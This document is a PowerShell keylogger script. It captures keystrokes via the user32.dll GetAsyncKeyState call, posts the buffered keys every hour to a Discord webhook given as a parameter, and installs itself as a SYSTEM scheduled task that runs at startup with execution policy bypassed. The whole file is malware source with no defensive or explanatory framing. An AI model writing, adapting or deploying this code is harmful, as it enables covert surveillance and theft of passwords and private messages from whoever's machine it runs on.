param (
    [string]$discord
)

# Function to capture keystrokes
function Start-KeyLogger {
    $key = ''
    $buffer = ''
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Keyboard {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
    }
"@
    while ($true) {
        Start-Sleep -Milliseconds 10
        for ($i = 0; $i -le 255; $i++) {
            $state = [Keyboard]::GetAsyncKeyState($i)
            if ($state -eq -32767) {
                $key += [char]$i
            }
        }
        if ($key.Length -gt 0) {
            $buffer += $key
            $key = ''
        }
        if ($buffer.Length -ge 100) { # Adjust buffer size if needed
            Write-Output $buffer
            $buffer = ''
        }
    }
}

# Function to send data via webhook
function Send-Data {
    param ([string]$data, [string]$webhookUrl)

    $payload = @{
        content = $data
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
}

# Start the keylogger in the background and send data every hour
Start-Job -ScriptBlock {
    while ($true) {
        $data = Start-KeyLogger | Out-String
        Send-Data -data $data -webhookUrl $using:discord
        Start-Sleep -Seconds 3600 # Send data every hour
    }
} -Name KeyLoggerJob

# Create a scheduled task to run this script at startup
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`" -discord $discord"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "KeyLoggerTask"
